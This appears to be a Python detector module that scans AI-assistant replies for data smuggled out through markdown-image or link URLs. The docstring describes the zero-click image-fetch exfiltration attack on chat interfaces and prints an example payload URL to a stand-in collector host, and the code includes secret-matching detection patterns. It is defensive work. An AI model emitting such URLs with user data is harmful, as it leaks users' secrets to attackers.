"""
ExfilWatch — URL / markdown-image exfiltration channel.

The best-documented real-world way to leak data out of an LLM reply is not
invisible Unicode at all: it is a markdown image (or link) whose URL carries
the stolen data, e.g.  ![x](https://collector.example/p.png?d=<base64 secret>).
Chat UIs auto-fetch images, so the leak is ZERO-CLICK.

We look for URLs whose parameters/path DECODE to printable data (base64, hex,
or a plaintext `key=value` secret). Decoding to a coherent string is strong
evidence: random tokens essentially never decode to printable text.
Ordinary links and images (no parameters, short marketing params) are ignored.
Set EXFILWATCH_TRUSTED_DOMAINS=cdn.mycompany.com,... to skip known hosts.
"""

import base64
import binascii
import math
import os
import re
from urllib.parse import parse_qsl, unquote, urlsplit

URL_RE = re.compile(r"https?://[^\s)>\]\"'<]+")
IMG_RE = re.compile(r"!\[[^\]]*\]\(\s*<?(https?://[^)\s>]+)|<img[^>]+src=[\"'](https?://[^\"']+)", re.I)
B64_RE = re.compile(r"[A-Za-z0-9_\-+/]+={0,2}")
HEX_RE = re.compile(r"(?:[0-9a-fA-F]{2})+")
SECRETISH = re.compile(
    r"(?i)\b(?:api[_-]?key|secret|passw(?:or)?d|token)\s*[=:]\s*\S{4,}|sk-[A-Za-z0-9]{8,}|AKIA[0-9A-Z]{12,}"
)


def _trusted(host: str) -> bool:
    allow = [d.strip().lower() for d in os.environ.get("EXFILWATCH_TRUSTED_DOMAINS", "").split(",") if d.strip()]
    host = (host or "").lower()
    return any(host == d or host.endswith("." + d) for d in allow)


def _entropy(s: str) -> float:
    return -sum((s.count(c) / len(s)) * math.log2(s.count(c) / len(s)) for c in set(s)) if s else 0.0


def _try_decode(value: str):
    """Return (decoded_text, how) if `value` carries readable data, else None."""
    v = unquote(value)
    if len(v) >= 16 and B64_RE.fullmatch(v):
        padded = v + "=" * (-len(v) % 4)
        for how, fn in (("base64", base64.urlsafe_b64decode), ("base64", base64.b64decode)):
            try:
                s = fn(padded).decode("utf-8")
            except (binascii.Error, UnicodeDecodeError, ValueError):
                continue
            if len(s) >= 6 and s.isprintable():
                return s, how
    if len(v) >= 16 and len(v) % 2 == 0 and HEX_RE.fullmatch(v):
        try:
            s = bytes.fromhex(v).decode("utf-8")
            if len(s) >= 6 and s.isprintable():
                return s, "hex"
        except (ValueError, UnicodeDecodeError):
            pass
    if len(v) >= 8 and SECRETISH.search(v):
        return v, "plaintext"
    return None


def scan(text: str) -> dict:
    out = {"decoded": None, "technique": None, "evidence": [], "reasons": []}
    images = {m.group(1) or m.group(2) for m in IMG_RE.finditer(text)}
    for url in dict.fromkeys(URL_RE.findall(text)):
        url = url.rstrip(".,;:")
        parts = urlsplit(url)
        if _trusted(parts.hostname or ""):
            continue
        is_image = any(url.startswith(i.rstrip(".,;:")) or i.startswith(url) for i in images)
        candidates = [v for _, v in parse_qsl(parts.query, keep_blank_values=True)]
        candidates += [parts.fragment] + [s for s in parts.path.split("/") if len(s) >= 16]
        for cand in candidates:
            hit = _try_decode(cand)
            if hit:
                msg, how = hit
                out["decoded"] = msg
                out["technique"] = ("Zero-click image-URL exfiltration (markdown/HTML image)" if is_image
                                    else "URL-parameter exfiltration (link)")
                out["evidence"].append((f"{'auto-loaded image' if is_image else 'link'} URL carries decodable data ({how})",
                                        400 if is_image else 200))
                out["reasons"].append(
                    f"The {'image' if is_image else 'link'} URL to {parts.hostname} embeds {how}-encoded data that decodes "
                    "to readable text. " + ("Chat clients fetch images automatically, so this leaks with zero clicks — "
                                             "the markdown-image exfiltration pattern seen in real LLM-assistant attacks."
                                             if is_image else "A click sends it to the attacker."))
                return out
        if is_image:
            for cand in candidates:
                if len(cand) >= 24 and _entropy(cand) >= 4.0:
                    out["evidence"].append(("auto-loaded image URL with long high-entropy parameter", 25))
                    out["reasons"].append(
                        f"Image URL to {parts.hostname} carries a long high-entropy parameter — possible encrypted "
                        "exfiltration (signed CDN URLs look similar; add trusted hosts to EXFILWATCH_TRUSTED_DOMAINS).")
                    break
    return out
